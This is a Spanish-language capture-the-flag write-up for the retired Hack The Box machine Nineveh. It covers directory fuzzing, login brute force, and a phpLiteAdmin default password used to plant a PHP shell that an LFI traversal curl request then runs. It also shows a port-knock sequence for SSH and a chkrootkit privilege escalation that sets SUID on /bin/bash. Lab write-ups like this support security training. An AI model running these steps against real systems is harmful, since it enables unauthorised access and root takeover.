---
machine: Nineveh
os: Linux
difficulty: Medium
platform: Hack The Box
category: Web / Enumeración
state: Retired
tags: [phpliteadmin, lfi, port-knocking, knockd, chkrootkit, cve-2014-0476]
---

# Nineveh — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Dos web: **80** con un login `/department` que esconde un **LFI** (`manage.php?notes=`) y un `phpinfo()`, y **443** con **phpLiteAdmin**. Se sube un shell PHP desde phpLiteAdmin a `/tmp` y se incluye con el LFI. La clave SSH de `amrois` está escondida en una imagen; el SSH está cerrado por **port knocking** y la escalada final es **chkrootkit 0.49** ejecutado por root sobre `/tmp/update`.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
80/tcp    open  http     Apache httpd 2.4.18
443/tcp   open  ssl/http Apache httpd 2.4.18
```

```bash
ffuf -u https://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k
# /db/index.php (phpLiteAdmin) ; en el 80: /department, /info.php, /secure_notes
```

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. **Fuerza bruta** del login de `/department` (usuario `admin`) con `hydra`.
2. **phpLiteAdmin** en `/db/index.php`: por defecto la contraseña es `password`, y la versión permite crear una base `.php` con código.
3. **LFI**: `manage.php?notes=` incluye ficheros; con `/ninevehNotes.txt/../../tmp/<shell>.php` se ejecuta el PHP creado.
4. **`www-data`**.

```bash
curl -k "https://<IP>/department/manage.php?notes=/ninevehNotes.txt/../../tmp/x.php"
```

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

- **`amrois`**: la imagen de `secure_notes` esconde una clave privada SSH (`steghide`/`strings`/`binwalk` según el caso).
- **SSH cerrado**: `ps auxww` muestra `knockd`; en `/etc/knockd.conf`:

```text
sequence = 571, 290, 911
seq_timeout = 5
start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

```bash
for p in 571 290 911; do nmap -Pn -p $p --max-retries 0 <IP>; done
ssh -i amrois_rsa amrois@<IP>
```

- **root**: `pspy` enseña `chkrootkit` lanzado por cron; la versión 0.49 ejecuta `/tmp/update` como root (CVE-2014-0476).

```bash
printf '#!/bin/bash\nchmod 4755 /bin/bash\n' > /tmp/update; chmod +x /tmp/update
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **LFI con prefijo**: hace falta el truco del `ninevehNotes.txt/../..` para salir del directorio.
- **HTTPS con certificado propio**: `curl -k` o añadir el host a `/etc/hosts`.
- **knockd y tiempo**: la secuencia caduca en segundos; los tres SYN deben ir seguidos.

- Un LFI combinado con subida de ficheros es RCE sin necesidad de un CVE de inclusión.
- Las imágenes y los ficheros "de notas" esconden claves.
- Port knocking no es seguridad, sólo ocultación: se lee la config y se replica.
- Un escáner de rootkits antiguo ejecutado por root es una puerta trasera.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.

## Referencias

- [CVE-2014-0476](https://nvd.nist.gov/vuln/detail/CVE-2014-0476)
- [lfi-to-rce](../../../knowledge/web/lfi-to-rce.md)
